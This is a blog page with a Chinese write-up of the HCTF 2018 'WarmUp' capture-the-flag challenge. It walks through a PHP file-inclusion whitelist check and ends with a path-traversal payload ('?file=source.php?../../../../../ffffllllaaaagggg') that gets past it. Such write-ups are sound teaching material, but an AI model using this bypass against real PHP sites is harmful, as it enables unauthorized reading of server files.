@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>HCTF 2018 WarmUp - My own pure land</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="">
+
+
+
+
+
+    <meta name="description" content="&amp;#x6253;&amp;#x5F00;&amp;#x662F;&amp;#x4E00;&amp;#x5F20;&amp;#x56FE;&amp;#x7247;&amp;#xFF0C;&amp;#x67E5;&amp;#x770B;&amp;#x6E90;&amp;#x7801;&amp;#x6709;&amp;#x63D0;&amp;#x793A;&amp;#xFF1A; 12345&lt;body&gt;    &lt;!--source.php--&gt;    &lt;br&gt;    &lt;img s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF 2018 WarmUp">
+<meta property="og:url" content="http://example.com/2020/09/21/2020-09-21-02/index.html">
+<meta property="og:site_name" content="My own pure land">
+<meta property="og:description" content="&amp;#x6253;&amp;#x5F00;&amp;#x662F;&amp;#x4E00;&amp;#x5F20;&amp;#x56FE;&amp;#x7247;&amp;#xFF0C;&amp;#x67E5;&amp;#x770B;&amp;#x6E90;&amp;#x7801;&amp;#x6709;&amp;#x63D0;&amp;#x793A;&amp;#xFF1A; 12345&lt;body&gt;    &lt;!--source.php--&gt;    &lt;br&gt;    &lt;img s">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-09-21T07:51:53.000Z">
+<meta property="article:modified_time" content="2020-09-21T08:01:21.777Z">
+<meta property="article:author" content="landvidar">
+<meta property="article:tag" content="BUU">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Landv
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">归档</a>
+            
+            <a class="navbar-item "
+               href="/categories/Game">游戏</a>
+            
+            <a class="navbar-item "
+               href="/categories/Book">书籍</a>
+            
+            <a class="navbar-item "
+               href="/categories/Security">安全</a>
+            
+            <a class="navbar-item "
+               href="/about">关于</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Suche" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            HCTF 2018 WarmUp
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2020-09-21T07:51:53.000Z" itemprop="datePublished">9月 21 2020</time>
+            
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            5 分钟 lesen (Über 771 Wörter)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><p>&#x6253;&#x5F00;&#x662F;&#x4E00;&#x5F20;&#x56FE;&#x7247;&#xFF0C;&#x67E5;&#x770B;&#x6E90;&#x7801;&#x6709;&#x63D0;&#x793A;&#xFF1A;</p>
+<figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-comment">&lt;!--source.php--&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<a id="more"></a>
+
+<p>&#x9996;&#x5148;&#x5148;&#x4E86;&#x89E3;&#x4E24;&#x4E2A; php &#x51FD;&#x6570;&#xFF0C;&#x65B9;&#x4FBF;&#x4E0B;&#x9762;&#x7684;&#x7406;&#x89E3;&#xFF1A;</p>
+<blockquote>
+<p>mb_strpos</p>
+<p>(PHP 4 &gt;= 4.0.6, PHP 5, PHP 7)</p>
+<p>mb_strpos &#x2014; &#x67E5;&#x627E;&#x5B57;&#x7B26;&#x4E32;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x9996;&#x6B21;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos ( <span class="hljs-keyword">string</span> $haystack , <span class="hljs-keyword">string</span> $needle [, <span class="hljs-keyword">int</span> $offset = <span class="hljs-number">0</span> [, <span class="hljs-keyword">string</span> $encoding = mb_internal_encoding() ]] ) : <span class="hljs-keyword">int</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x4F8B;&#x5982;&#x9898;&#x4E2D;&#x6709;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos($page . <span class="hljs-string">&apos;?&apos;</span>, <span class="hljs-string">&apos;?&apos;</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x5373;&#x4E3A; page &#x7684;&#x503C;&#x62FC;&#x63A5; &#x2018;?&#x2019; &#x4F5C;&#x4E3A;&#x88AB;&#x67E5;&#x627E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x2019;?&#x2019; &#x5219;&#x4E3A;&#x9700;&#x8981;&#x67E5;&#x627E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x82E5; page &#x4E2D;&#x65E0; &#x2018;?&#x2019; &#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5C06;&#x662F; page &#x7684;&#x957F;&#x5EA6;&#x3002;</p>
+<p>mb_substr</p>
+<p>(PHP 4 &gt;= 4.0.6, PHP 5, PHP 7)</p>
+<p>mb_substr &#x2014; &#x83B7;&#x53D6;&#x90E8;&#x5206;&#x5B57;&#x7B26;&#x4E32;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_substr ( <span class="hljs-keyword">string</span> $str , <span class="hljs-keyword">int</span> $start [, <span class="hljs-keyword">int</span> $length = <span class="hljs-literal">NULL</span> [, <span class="hljs-keyword">string</span> $encoding = mb_internal_encoding() ]] ) : <span class="hljs-keyword">string</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x4F8B;&#x5982;&#x9898;&#x4E2D;&#x6709;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="hljs-number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="hljs-string">&apos;?&apos;</span>, <span class="hljs-string">&apos;?&apos;</span>)</span><br><span class="line">            );</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x5373;&#x4E3A;&#x4ECE; page &#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x5F00;&#x59CB;&#xFF0C;&#x622A;&#x53D6; mb_strpos($page . &#x2018;?&#x2019;, &#x2018;?&#x2019;) &#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x957F;&#x5EA6;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5982;&#x679C;&#x503C;&#x662F; 2 &#xFF0C;&#x90A3;&#x4E48;&#x7ED3;&#x679C;&#x5C31;&#x662F; page &#x7684;&#x524D;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x3002;</p>
+<p>&#x7EFC;&#x4E0A;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x622A;&#x53D6; page &#x4E2D; &#x2018;?&#x2019; &#x4E4B;&#x524D;&#x7684;&#x90E8;&#x5206;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
+</blockquote>
+<p>&#x56DE;&#x5230;&#x6B63;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x6253;&#x5F00; source.php &#xFF0C;&#x53D1;&#x73B0;&#x6709; php &#x6E90;&#x7801;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">	<span class="hljs-comment">//&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x7C7B; &#x7C7B;&#x540D; emmm</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span></span><br><span class="line"><span class="hljs-class">    </span>{</span><br><span class="line">        <span class="hljs-comment">//&#x9759;&#x6001;&#x516C;&#x5171;&#x65B9;&#x6CD5;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x5B9E;&#x4F8B;&#x5316;&#x7C7B;</span></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;$page</span>)</span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">            <span class="hljs-comment">//&#x767D;&#x540D;&#x5355;&#x952E;&#x503C;&#x5BF9;&#x6570;&#x7EC4;</span></span><br><span class="line">            $whitelist = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="hljs-comment">//&#x9650;&#x5236;&#x6761;&#x4EF6;1&#xFF1A;page &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x5E76;&#x4E14;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) {</span><br><span class="line">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&apos;t see it&quot;</span>;</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">			<span class="hljs-comment">//&#x9650;&#x5236;&#x6761;&#x4EF6;2&#xFF1A;page &#x7684;&#x503C;&#x9700;&#x8981;&#x5728;&#x767D;&#x540D;&#x5355;&#x5185;</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">            }</span><br><span class="line">			<span class="hljs-comment">//&#x9650;&#x5236;&#x6761;&#x4EF6;3&#xFF1A;</span></span><br><span class="line">            <span class="hljs-comment">//&#x622A;&#x53D6;&#x5B50;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="hljs-number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="hljs-string">&apos;?&apos;</span>, <span class="hljs-string">&apos;?&apos;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="hljs-comment">//&#x8FD9;&#x4E2A;&#x5B50;&#x5B57;&#x7B26;&#x4E32;&#x4E5F;&#x9700;&#x8981;&#x5728;&#x767D;&#x540D;&#x5355;&#x5F53;&#x4E2D;</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">            }</span><br><span class="line">			</span><br><span class="line">            <span class="hljs-comment">//&#x9650;&#x5236;&#x6761;&#x4EF6;4&#xFF1A;</span></span><br><span class="line">            <span class="hljs-comment">//&#x8FDB;&#x884C;&#x4E86; url &#x89E3;&#x7801;</span></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            <span class="hljs-comment">//&#x540C;&#x9650;&#x5236;&#x6761;&#x4EF6;3&#xFF0C;&#x89E3;&#x7801;&#x540E;&#x7ED3;&#x679C;&#x622A;&#x53D6;&#x540E;&#x7684;&#x5B50;&#x5B57;&#x7B26;&#x4E32;&#x4E5F;&#x9700;&#x8981;&#x5728;&#x767D;&#x540D;&#x5355;&#x5F53;&#x4E2D;</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="hljs-number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="hljs-string">&apos;?&apos;</span>, <span class="hljs-string">&apos;?&apos;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&apos;t see it&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">	<span class="hljs-comment">//&#x9700;&#x8981;&#x6211;&#x4EEC;&#x4F20;&#x5165; file &#x53C2;&#x6570;&#xFF0C;file &#x5FC5;&#x987B;&#x8FD4;&#x56DE;&#x4E3A; true</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">&apos;file&apos;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&apos;file&apos;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&apos;file&apos;</span>])</span><br><span class="line">    ) {</span><br><span class="line">        <span class="hljs-comment">//&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x8981;&#x53BB; getflag &#x7684;&#x5173;&#x952E;&#x70B9;</span></span><br><span class="line">        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">&apos;file&apos;</span>];</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    }  </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x800C;&#x5176;&#x4E2D;&#x63D0;&#x5230;&#x4E86; hint.php &#xFF0C;&#x6253;&#x5F00;&#x6709;&#x5982;&#x4E0B;&#x63D0;&#x793A;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x901A;&#x7BC7;&#x68B3;&#x7406;&#x4E00;&#x4E0B;&#xFF1A;</p>
+<p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4F20;&#x5165;&#x4E00;&#x4E2A; string &#x53C2;&#x6570; file &#xFF0C;file &#x7684;&#x503C;&#x901A;&#x8FC7; checkFile &#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x68C0;&#x9A8C;&#xFF0C;&#x800C; file &#x5FC5;&#x987B;&#x5E26;&#x6709; ffffllllaaaagggg &#x5B57;&#x6837;&#x4EE5;&#x4F9B;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x83B7;&#x53D6; flag &#xFF0C;&#x5728;&#x65B9;&#x6CD5;&#x7684; 4 &#x4E2A;&#x9650;&#x5236;&#x6761;&#x4EF6;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x7B2C; 2 &#x4E2A;&#x6211;&#x4EEC;&#x662F;&#x7EDD;&#x5BF9;&#x4E0D;&#x53EF;&#x80FD;&#x6EE1;&#x8DB3;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ED5;&#x8FC7;&#x7B2C; 3 &#x6216;&#x8005; &#x7B2C; 4 &#x4E2A;&#x6761;&#x4EF6;&#x6765;&#x8FBE;&#x5230; return true &#x7684;&#x76EE;&#x7684;&#x3002;</p>
+<p>&#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x6784;&#x9020;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?../ffffllllaaaagggg</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x6761;&#x4EF6; 3 &#x6216; 4 &#x53EA;&#x4E0D;&#x8FC7;&#x662F;&#x8981;&#x6C42; &#x2018;?&#x2019; &#x524D;&#x5FC5;&#x987B;&#x5728;&#x767D;&#x540D;&#x5355;&#x4E2D;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x81EA;&#x884C;&#x6DFB;&#x52A0; &#x2018;?&#x2019; &#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#xFF0C;&#x800C;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x7684;&#x662F; &#x2018;?&#x2019; &#x540E;&#x7684;&#x6587;&#x4EF6;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x77E5;&#x9053; ffffllllaaaagggg &#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x76EE;&#x5F55;&#x7A7F;&#x8D8A;&#x8BFB;&#x53D6;&#x3002;</p>
+<p>&#x6700;&#x540E;&#x7684; payload &#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></tbody></table></figure>
+
+</body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/BUU/">#BUU</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/PHP/">#PHP</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2020/09/21/2020-09-21-01/">BUU-Web-WP合集</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+<div class="sharebox">
+    
+<div class="sharethis-inline-share-buttons"></div>
+<script type='text/javascript' src=' ' async='async'></script>
+
+</div>
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Kommentare</h3>
+    
+<script>
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2020/09/21/2020-09-21-02/';
+        this.page.identifier = '2020/09/21/2020-09-21-02/';
+        
+        this.language = 'zh';
+        
+    };
+    (function() {
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'landvidar' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<div id="disqus_thread">
+    
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 landvidar&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("zh-CN");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+</body>
+</html>
